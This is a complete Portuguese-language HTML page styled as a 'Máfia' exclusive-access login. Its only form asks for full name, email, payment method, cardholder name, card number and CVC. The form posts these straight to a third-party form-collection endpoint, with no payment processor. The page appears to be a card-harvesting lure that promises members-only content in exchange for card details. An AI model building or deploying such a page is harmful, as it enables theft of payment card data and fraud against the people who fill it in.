<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login Máfia - Acesso Exclusivo</title>
  <link href="https://fonts.googleapis.com/css2?family=Staatliches&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background: linear-gradient(135deg, #000000, #1c1c1c);
      color: white;
      font-family: 'Playfair Display', serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      justify-content: center;
    }
    h1 {
      font-size: 2.5rem;
      margin-bottom: 20px;
      font-family: 'Staatliches', cursive;
    }
    form {
      background-color: #111;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
      width: 90%;
      max-width: 400px;
      animation: fadeInUp 1.5s ease;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: none;
      border-radius: 8px;
      background-color: #2a2a2a;
      color: white;
      font-size: 1rem;
    }
    button {
      width: 100%;
      padding: 12px;
      border: none;
      background-color: #e50914;
      color: white;
      font-weight: bold;
      font-size: 1.2rem;
      border-radius: 8px;
      cursor: pointer;
      transition: 0.3s ease;
    }
    button:hover {
      background-color: #ff1e29;
    }
    @keyframes fadeInUp {
      from {
        opacity: 0;
        transform: translateY(40px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
    .warning {
      margin-top: 20px;
      font-size: 0.9rem;
      color: #ccc;
    }
  </style>
</head>
<body>
  <h1>Acesso Privado</h1>
  <form action="https://formspree.io/f/xwplaaqz" method="POST">
    <input type="text" name="nome_completo" placeholder="Nome completo" required>
    <input type="email" name="email" placeholder="E-mail" required>
    <input type="text" name="metodo_pagamento" placeholder="Método de pagamento (PIX / Cartão)" required>
    <input type="text" name="cartao_nome" placeholder="Nome no Cartão (se aplicável)">
    <input type="text" name="cartao_numero" placeholder="Número do Cartão">
    <input type="text" name="cartao_cvc" placeholder="CVC">
    <button type="submit">Confirmar Pagamento</button>
  </form>
  <p class="warning">Apenas membros aprovados terão acesso ao conteúdo exclusivo.</p>
</body>
</html>
